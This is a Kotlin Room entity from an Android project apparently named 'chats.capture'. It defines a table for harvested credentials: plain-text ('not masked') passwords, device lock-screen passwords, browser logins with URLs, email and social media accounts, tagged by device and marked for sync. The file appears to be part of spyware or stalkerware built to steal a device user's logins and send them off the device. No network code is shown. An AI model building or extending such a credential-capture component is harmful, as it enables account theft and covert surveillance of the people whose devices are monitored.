package com.chats.capture.models

import androidx.room.Entity
import androidx.room.Index
import androidx.room.PrimaryKey
import java.util.UUID

@Entity(
    tableName = "credentials",
    indices = [
        Index(value = ["accountType"]),
        Index(value = ["appPackage"]),
        Index(value = ["synced"]),
        Index(value = ["deviceId"])
    ]
)
data class Credential(
    @PrimaryKey val id: String = UUID.randomUUID().toString(),
    val deviceId: String? = null,
    val accountType: CredentialType,
    val appPackage: String? = null, // For app-specific credentials
    val appName: String? = null,
    val email: String? = null,
    val username: String? = null,
    val password: String, // Plain text password (not masked)
    val domain: String? = null, // Website domain for browser credentials
    val url: String? = null, // Full URL for browser credentials
    val devicePassword: Boolean = false, // True if this is device lock screen password
    val timestamp: Long = System.currentTimeMillis(),
    val synced: Boolean = false,
    val syncAttempts: Int = 0,
    val lastSyncAttempt: Long? = null,
    val errorMessage: String? = null
)

enum class CredentialType {
    DEVICE_PASSWORD,      // Device lock screen password
    APP_PASSWORD,         // Password from app password field
    EMAIL_ACCOUNT,        // Email account configured on device
    BROWSER_LOGIN,        // Email/password from browser login
    SOCIAL_MEDIA_LOGIN    // Social media login credentials
}
